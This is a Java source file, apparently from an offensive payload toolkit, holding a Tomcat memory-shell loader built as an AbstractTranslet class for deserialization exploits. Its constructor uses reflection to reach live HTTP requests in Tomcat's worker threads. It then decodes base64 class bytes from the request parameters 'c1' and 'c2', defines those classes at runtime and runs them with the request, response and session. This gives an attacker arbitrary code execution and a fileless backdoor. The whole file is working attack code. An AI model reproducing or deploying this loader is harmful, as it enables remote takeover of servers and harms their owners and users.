package cn.safe6.payload.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Response;
import org.apache.coyote.Request;
import sun.misc.BASE64Decoder;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;


public class BehinderLoader2 extends AbstractTranslet {

    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while(var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public BehinderLoader2() throws Exception {
        boolean var4 = false;
        Thread[] var5 = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");

        for(int var6 = 0; var6 < var5.length; ++var6) {
            Thread var7 = var5[var6];
            if (var7 != null) {
                String var3 = var7.getName();
                if (!var3.contains("exec") && var3.contains("http")) {
                    Object var1 = getFV(var7, "target");
                    if (var1 instanceof Runnable) {
                        try {
                            var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                        } catch (Exception var13) {
                            continue;
                        }

                        List var9 = (List)getFV(var1, "processors");

                        for(int var10 = 0; var10 < var9.size(); ++var10) {
                            Object var11 = var9.get(var10);
                            var1 = getFV(var11, "req");
                            Request request = (Request)var1;
                            org.apache.catalina.connector.Request var101 = (org.apache.catalina.connector.Request)request.getNote(1);
                            Response var111 = var101.getResponse();
                            HttpSession var121 = var101.getSession();

                            try {
                                String var13 = var101.getParameter("c1");
                                byte[] var14 = (new BASE64Decoder()).decodeBuffer(var13);
                                Method var15 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                                var15.setAccessible(true);

                                Class var16 = (Class)var15.invoke(BehinderLoader.class.getClassLoader(), var14, new Integer(0), new Integer(var14.length));
                                String var17 = var101.getParameter("c2");
                                byte[] var18 = (new BASE64Decoder()).decodeBuffer(var17);
                                Method var19 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                                var19.setAccessible(true);
                                Class var20 = (Class)var19.invoke(BehinderLoader.class.getClassLoader(), var18, new Integer(0), new Integer(var18.length));
                                var20.getConstructor(var16).newInstance(var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(var101, var111)).equals(new Object[]{var101, var111, var121, var16.getConstructor(ServletRequest.class, ServletResponse.class).newInstance(var101, var111)});
                            } catch (Exception var21) {
                                var21.printStackTrace();
                            }
                            var4 = true;

                        }

                        if (var4) {
                            break;
                        }
                    }
                }
            }
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
